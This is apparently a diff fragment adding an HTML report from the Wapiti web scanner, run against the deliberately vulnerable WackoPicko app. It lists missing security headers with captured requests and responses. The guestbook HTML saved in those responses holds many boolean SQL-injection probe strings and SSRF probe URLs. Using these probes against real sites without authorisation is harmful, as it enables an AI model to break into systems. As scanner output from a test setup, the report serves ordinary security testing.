+		&lt;p class=&#34;comment&#34;&gt;https://wapiti3.ovh/ssrf/t9izvr/1/636f6d6d656e74/&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by https://wapiti3.ovh/ssrf/t9izvr/1/6e616d65/ &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by https://wapiti3.ovh/ssrf/t9izvr/2/6e616d65/ &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;https://wapiti3.ovh/ssrf/t9izvr/2/636f6d6d656e74/&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz AND 32=32 AND 58=58 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039; AND 43=103 AND &amp;#039;47&amp;#039;=&amp;#039;47 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039; AND 99=194 AND &amp;#039;27&amp;#039;=&amp;#039;27 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039; AND 68=68 AND &amp;#039;44&amp;#039;=&amp;#039;44 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot; AND 26=72 AND &amp;quot;82&amp;quot;=&amp;quot;82 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot; AND 67=114 AND &amp;quot;71&amp;quot;=&amp;quot;71 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot; AND 38=38 AND &amp;quot;78&amp;quot;=&amp;quot;78 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz) AND 66=115 AND (63=63 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz) AND 15=86 AND (54=54 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz) AND 19=19 AND (77=77 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039;) AND 24=36 AND (&amp;#039;10&amp;#039;=&amp;#039;10 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039;) AND 20=60 AND (&amp;#039;32&amp;#039;=&amp;#039;32 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;#039;) AND 54=54 AND (&amp;#039;56&amp;#039;=&amp;#039;56 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot;) AND 57=133 AND (&amp;quot;11&amp;quot;=&amp;quot;11 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot;) AND 74=145 AND (&amp;quot;89&amp;quot;=&amp;quot;89 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz&amp;quot;) AND 57=57 AND (&amp;quot;67&amp;quot;=&amp;quot;67 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default¿&amp;#039;&amp;quot;( &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;default¿&#39;&#34;(&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default AND 28=116 AND 77=77 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default AND 14=94 AND 88=88 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default AND 39=39 AND 43=43 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039; AND 58=82 AND &amp;#039;84&amp;#039;=&amp;#039;84 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039; AND 97=186 AND &amp;#039;22&amp;#039;=&amp;#039;22 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039; AND 10=10 AND &amp;#039;28&amp;#039;=&amp;#039;28 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot; AND 81=146 AND &amp;quot;11&amp;quot;=&amp;quot;11 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot; AND 87=117 AND &amp;quot;32&amp;quot;=&amp;quot;32 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot; AND 35=35 AND &amp;quot;25&amp;quot;=&amp;quot;25 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default) AND 37=99 AND (39=39 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default) AND 39=122 AND (50=50 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default) AND 98=98 AND (35=35 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039;) AND 27=114 AND (&amp;#039;94&amp;#039;=&amp;#039;94 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039;) AND 60=85 AND (&amp;#039;54&amp;#039;=&amp;#039;54 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;#039;) AND 18=18 AND (&amp;#039;47&amp;#039;=&amp;#039;47 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot;) AND 44=121 AND (&amp;quot;79&amp;quot;=&amp;quot;79 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot;) AND 44=136 AND (&amp;quot;16&amp;quot;=&amp;quot;16 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default&amp;quot;) AND 58=58 AND (&amp;quot;26&amp;quot;=&amp;quot;26 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there! AND 90=174 AND 37=37&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there! AND 86=101 AND 42=42&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there! AND 57=57 AND 95=95&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39; AND 13=95 AND &#39;95&#39;=&#39;95&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39; AND 85=157 AND &#39;46&#39;=&#39;46&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#39; AND 17=17 AND &#39;32&#39;=&#39;32&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&#34; AND 44=63 AND &#34;58&#34;=&#34;58&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz¿&#39;&#34;(&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz¿&amp;#039;&amp;quot;( &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz AND 58=114 AND 90=90&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz AND 28=67 AND 51=51&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz AND 58=58 AND 41=41&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39; AND 50=122 AND &#39;59&#39;=&#39;59&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39; AND 63=134 AND &#39;92&#39;=&#39;92&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39; AND 17=17 AND &#39;91&#39;=&#39;91&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34; AND 96=189 AND &#34;60&#34;=&#34;60&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34; AND 89=173 AND &#34;35&#34;=&#34;35&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34; AND 66=66 AND &#34;90&#34;=&#34;90&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz) AND 84=157 AND (25=25&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz) AND 53=152 AND (85=85&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz) AND 32=32 AND (97=97&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39;) AND 50=84 AND (&#39;10&#39;=&#39;10&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39;) AND 91=148 AND (&#39;63&#39;=&#39;63&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#39;) AND 60=60 AND (&#39;62&#39;=&#39;62&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34;) AND 10=88 AND (&#34;47&#34;=&#34;47&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34;) AND 58=78 AND (&#34;74&#34;=&#34;74&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&#34;) AND 55=55 AND (&#34;45&#34;=&#34;45&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz AND 77=160 AND 45=45 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz AND 79=104 AND 47=47 &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi, I love your site!&lt;/p&gt;
+	&lt;p&gt; - by adam &lt;/p&gt;
+	
+
+
+
+&lt;form action=&#34;/guestbook.php&#34; method=&#34;POST&#34;&gt;
+   Name: &lt;br&gt;
+   &lt;input type=&#34;text&#34; name=&#34;name&#34; /&gt;&lt;br&gt;
+   Comment: &lt;br&gt;
+   &lt;textarea id=&#34;comment-box&#34; name=&#34;comment&#34;&gt;&lt;/textarea&gt; &lt;br&gt;
+   &lt;input type=&#34;submit&#34; value=&#34;Submit&#34; /&gt;
+&lt;/form&gt;
+
+
+&lt;/div&gt;
+       &lt;div class=&#34;column span-24 first last&#34; id=&#34;footer&#34; &gt;
+	&lt;ul&gt;
+	  &lt;li&gt;&lt;a href=&#34;/&#34;&gt;Home&lt;/a&gt; |&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&#34;/admin/index.php?page=login&#34;&gt;Admin&lt;/a&gt; |&lt;/li&gt;
+	  &lt;li&gt;&lt;a href=&#34;mailto:contact@wackopicko.com&#34;&gt;Contact&lt;/a&gt; |&lt;/li&gt;
+	  &lt;li&gt;&lt;a href=&#34;/tos.php&#34;&gt;Terms of Service&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+   
+                                </pre>
+                            </section>
+                        <section id="tab-vuln-3-0-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-3-0-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-CONF-12&#39;, &#39;OSHP-Content-Security-Policy&#39;]</pre>
+                        </section>
+
+                <dl><dt>Solutions</dt><dd>Configuring Content Security Policy involves adding the Content-Security-Policy HTTP header to a web page and giving it values to control what resources the user agent is allowed to load for that page.</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Mozilla: Content Security Policy (CSP)</a></li>
+                    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html">OWASP: Content Security Policy Cheat Sheet</a></li>
+                    <li><a href="https://owasp.org/www-pdf-archive/2019-02-22_-_How_do_I_Content_Security_Policy_-_Print.pdf">OWASP: How to do Content Security Policy (PDF)</a></li>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy">OWASP: Content Security Policy</a></li>
+                </ul>
+                <br />
+                <hr>
+                <h3 id="vuln_type_12">HTTP Secure Headers</h3>
+                <dl>
+                    <dt>Description</dt>
+                    <dd>HTTP security headers tell the browser how to behave when handling the website&#39;s content.</dd>
+                </dl>
+
+                        <h4>🟡 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-12-0-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-12-0-2">HTTP Request</a>
+                                <a href="#tab-vuln-12-0-3">HTTP Response</a>
+                            <a href="#tab-vuln-12-0-4">cURL command line</a>
+                            <a href="#tab-vuln-12-0-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-12-0-1" style="min-height: 124px;">
+                            <pre>X-Frame-Options is not set</pre>
+                        </section>
+                        <section id="tab-vuln-12-0-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    GET /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                            </pre>
+                        </section>
+                            <section id="tab-vuln-12-0-3" style="min-height: 124px;" class="is-hidden">
+                                <pre style="white-space: nowrap">
+                                    HTTP 200<br />
+                                            date: Wed, 20 Mar 2024 14:22:46 GMT<br />
+                                            server: Apache/2.4.57 (Debian)<br />
+                                            x-powered-by: PHP/8.2.10<br />
+                                            expires: Thu, 19 Nov 1981 08:52:00 GMT<br />
+                                            cache-control: no-store, no-cache, must-revalidate<br />
+                                            pragma: no-cache<br />
+                                            vary: Accept-Encoding<br />
+                                            content-length: 991<br />
+                                            keep-alive: timeout=5, max=100<br />
+                                            connection: Keep-Alive<br />
+                                            content-type: text/html; charset=UTF-8<br />
+                                    <br />
+                                    
+
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/screen.css&#34; type=&#34;text/css&#34; media=&#34;screen, projection&#34;&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/print.css&#34; type=&#34;text/css&#34; media=&#34;print&#34;&gt;
+    &lt;!--[if IE]&gt;&lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/ie.css&#34; type=&#34;text/css&#34; media=&#34;screen, projection&#34;&gt;&lt;![endif]--&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/stylings.css&#34; type=&#34;text/css&#34; media=&#34;screen&#34;&gt;
+    &lt;title&gt;WackoPicko.com&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;div class=&#34;container &#34; style=&#34;border: 2px solid #5c95cf;&#34;&gt;
+      &lt;div class=&#34;column span-24 first last&#34;&gt;
+	&lt;h1 id=&#34;title&#34;&gt;&lt;a href=&#34;/&#34;&gt;WackoPicko.com&lt;/a&gt;&lt;/h1&gt;
+      &lt;/div&gt;
+      &lt;div id=&#34;menu&#34;&gt;
+	&lt;div class=&#34;column prepend-1 span-14 first&#34;&gt;
+	  &lt;ul class=&#34;menu&#34;&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/users/home.php&#34;&gt;&lt;span&gt;Home&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/pictures/upload.php&#34;&gt;&lt;span&gt;Upload&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/pictures/recent.php&#34;&gt;&lt;span&gt;Recent&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+            &lt;li class=&#34;current&#34;&gt;&lt;a href=&#34;/guestbook.php&#34;&gt;&lt;span&gt;Guestbook&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+
+      	  &lt;/ul&gt;
+	&lt;/div&gt;
+	&lt;div class=&#34;column prepend-1 span-7 first last&#34;&gt;
+	  &lt;ul class=&#34;menu top_login&#34; &gt;
+      	    &lt;li&gt;&lt;a href=&#34;/users/login.php&#34;&gt;&lt;Span&gt;Login&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+      	  &lt;/ul&gt;
+	&lt;/div&gt;
+      &lt;/div&gt;
+
+
+
+      &lt;div class=&#34;column span-24 first last&#34; id=&#34;search_bar_blue&#34;&gt;
+	&lt;div class=&#34;column prepend-17 span-7 first last&#34; id=&#34;search_box&#34;&gt;
+	  &lt;form action=&#34;/pictures/search.php&#34; method=&#34;get&#34; style=&#34;display:inline;&#34;&gt;
+	    &lt;input id=&#34;query2&#34; name=&#34;query&#34; size=&#34;15&#34; style=&#34;padding: 2px; font-size: 16px; text-decoration:none;border:none;vertical-align:middle;&#34; type=&#34;text&#34; value=&#34;&#34;/&gt;
+	    &lt;input src=&#34;/images/search_button_white.gif&#34; type=&#34;image&#34; style=&#34;border: 0pt none ; position: relative; top: 0px;vertical-align:middle;margin-left: 1em;&#34; /&gt;
+	  &lt;/form&gt;
+	&lt;/div&gt;
+      &lt;/div&gt;
+   
+&lt;div class=&#34;column prepend-1 span-24 first last&#34;&gt;
+&lt;h2&gt;Guestbook&lt;/h2&gt;
+&lt;h4&gt;See what people are saying about us!&lt;/h4&gt;
+
+	&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi, I love your site!&lt;/p&gt;
+	&lt;p&gt; - by adam &lt;/p&gt;
+	
+
+
+
+&lt;form action=&#34;/guestbook.php&#34; method=&#34;POST&#34;&gt;
+   Name: &lt;br&gt;
+   &lt;input type=&#34;text&#34; name=&#34;name&#34; /&gt;&lt;br&gt;
+   Comment: &lt;br&gt;
+   &lt;textarea id=&#34;comment-box&#34; name=&#34;comment&#34;&gt;&lt;/textarea&gt; &lt;br&gt;
+   &lt;input type=&#34;submit&#34; value=&#34;Submit&#34; /&gt;
+&lt;/form&gt;
+
+
+&lt;/div&gt;
+       &lt;div class=&#34;column span-24 first last&#34; id=&#34;footer&#34; &gt;
+	&lt;ul&gt;
+	  &lt;li&gt;&lt;a href=&#34;/&#34;&gt;Home&lt;/a&gt; |&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&#34;/admin/index.php?page=login&#34;&gt;Admin&lt;/a&gt; |&lt;/li&gt;
+	  &lt;li&gt;&lt;a href=&#34;mailto:contact@wackopicko.com&#34;&gt;Contact&lt;/a&gt; |&lt;/li&gt;
+	  &lt;li&gt;&lt;a href=&#34;/tos.php&#34;&gt;Terms of Service&lt;/a&gt;&lt;/li&gt;
+	&lt;/ul&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+   
+                                </pre>
+                            </section>
+                        <section id="tab-vuln-12-0-4" style="min-height: 124px;" class="is-hidden">
+                            <pre>curl &#34;http://web/guestbook.php&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-12-0-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;OSHP-X-Frame-Options&#39;]</pre>
+                        </section>
+                        <h4>🟡 Vulnerability found in /guestbook.php</h4>
+                        <nav class="tabs" data-kube="tabs" data-equal="true" data-height="equal">
+                            <a href="#tab-vuln-12-1-1" class="is-active">Description</a>
+                            <a href="#tab-vuln-12-1-2">HTTP Request</a>
+                                <a href="#tab-vuln-12-1-3">HTTP Response</a>
+                            <a href="#tab-vuln-12-1-4">cURL command line</a>
+                            <a href="#tab-vuln-12-1-5">WSTG Code</a>
+                        </nav>
+                        <section id="tab-vuln-12-1-1" style="min-height: 124px;">
+                            <pre>X-Content-Type-Options is not set</pre>
+                        </section>
+                        <section id="tab-vuln-12-1-2" style="min-height: 124px;" class="is-hidden">
+                            <pre style="white-space: normal;">
+                                    GET /guestbook.php HTTP/1.1
+                                    <br>
+                                    host: web
+                                    <br>
+                                    connection: keep-alive
+                                    <br>
+                                    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+                                    <br>
+                                    accept-language: en-US
+                                    <br>
+                                    accept-encoding: gzip, deflate, br
+                                    <br>
+                                    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+                                    <br>
+                                    content-type: application/x-www-form-urlencoded
+                                    <br>
+                                    cookie: PHPSESSID=pcoa73bfhae7c51btkm85asfgs
+                                    <br>
+                            </pre>
+                        </section>
+                            <section id="tab-vuln-12-1-3" style="min-height: 124px;" class="is-hidden">
+                                <pre style="white-space: nowrap">
+                                    HTTP 200<br />
+                                            date: Wed, 20 Mar 2024 14:22:46 GMT<br />
+                                            server: Apache/2.4.57 (Debian)<br />
+                                            x-powered-by: PHP/8.2.10<br />
+                                            expires: Thu, 19 Nov 1981 08:52:00 GMT<br />
+                                            cache-control: no-store, no-cache, must-revalidate<br />
+                                            pragma: no-cache<br />
+                                            vary: Accept-Encoding<br />
+                                            content-length: 991<br />
+                                            keep-alive: timeout=5, max=100<br />
+                                            connection: Keep-Alive<br />
+                                            content-type: text/html; charset=UTF-8<br />
+                                    <br />
+                                    
+
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/screen.css&#34; type=&#34;text/css&#34; media=&#34;screen, projection&#34;&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/print.css&#34; type=&#34;text/css&#34; media=&#34;print&#34;&gt;
+    &lt;!--[if IE]&gt;&lt;link rel=&#34;stylesheet&#34; href=&#34;/css/blueprint/ie.css&#34; type=&#34;text/css&#34; media=&#34;screen, projection&#34;&gt;&lt;![endif]--&gt;
+    &lt;link rel=&#34;stylesheet&#34; href=&#34;/css/stylings.css&#34; type=&#34;text/css&#34; media=&#34;screen&#34;&gt;
+    &lt;title&gt;WackoPicko.com&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;div class=&#34;container &#34; style=&#34;border: 2px solid #5c95cf;&#34;&gt;
+      &lt;div class=&#34;column span-24 first last&#34;&gt;
+	&lt;h1 id=&#34;title&#34;&gt;&lt;a href=&#34;/&#34;&gt;WackoPicko.com&lt;/a&gt;&lt;/h1&gt;
+      &lt;/div&gt;
+      &lt;div id=&#34;menu&#34;&gt;
+	&lt;div class=&#34;column prepend-1 span-14 first&#34;&gt;
+	  &lt;ul class=&#34;menu&#34;&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/users/home.php&#34;&gt;&lt;span&gt;Home&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/pictures/upload.php&#34;&gt;&lt;span&gt;Upload&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+	    &lt;li class=&#34;&#34;&gt;&lt;a href=&#34;/pictures/recent.php&#34;&gt;&lt;span&gt;Recent&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+            &lt;li class=&#34;current&#34;&gt;&lt;a href=&#34;/guestbook.php&#34;&gt;&lt;span&gt;Guestbook&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+
+      	  &lt;/ul&gt;
+	&lt;/div&gt;
+	&lt;div class=&#34;column prepend-1 span-7 first last&#34;&gt;
+	  &lt;ul class=&#34;menu top_login&#34; &gt;
+      	    &lt;li&gt;&lt;a href=&#34;/users/login.php&#34;&gt;&lt;Span&gt;Login&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;
+      	  &lt;/ul&gt;
+	&lt;/div&gt;
+      &lt;/div&gt;
+
+
+
+      &lt;div class=&#34;column span-24 first last&#34; id=&#34;search_bar_blue&#34;&gt;
+	&lt;div class=&#34;column prepend-17 span-7 first last&#34; id=&#34;search_box&#34;&gt;
+	  &lt;form action=&#34;/pictures/search.php&#34; method=&#34;get&#34; style=&#34;display:inline;&#34;&gt;
+	    &lt;input id=&#34;query2&#34; name=&#34;query&#34; size=&#34;15&#34; style=&#34;padding: 2px; font-size: 16px; text-decoration:none;border:none;vertical-align:middle;&#34; type=&#34;text&#34; value=&#34;&#34;/&gt;
+	    &lt;input src=&#34;/images/search_button_white.gif&#34; type=&#34;image&#34; style=&#34;border: 0pt none ; position: relative; top: 0px;vertical-align:middle;margin-left: 1em;&#34; /&gt;
+	  &lt;/form&gt;
+	&lt;/div&gt;
+      &lt;/div&gt;
+   
+&lt;div class=&#34;column prepend-1 span-24 first last&#34;&gt;
+&lt;h2&gt;Guestbook&lt;/h2&gt;
+&lt;h4&gt;See what people are saying about us!&lt;/h4&gt;
+
+	&lt;p class=&#34;comment&#34;&gt;fuzz&lt;/p&gt;
+	&lt;p&gt; - by fuzz &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi there!&lt;/p&gt;
+	&lt;p&gt; - by default &lt;/p&gt;
+		&lt;p class=&#34;comment&#34;&gt;Hi, I love your site!&lt;/p&gt;
+	&lt;p&gt; - by adam &lt;/p&gt;
+	
+
+
+
+&lt;form action=&#34;/guestbook.php&#34; method=&#34;POST&#34;&gt;
+   Name: &lt;br&gt;
+   &lt;input type=&#34;text&#34; name=&#34;name&#34; /&gt;&lt;br&gt;
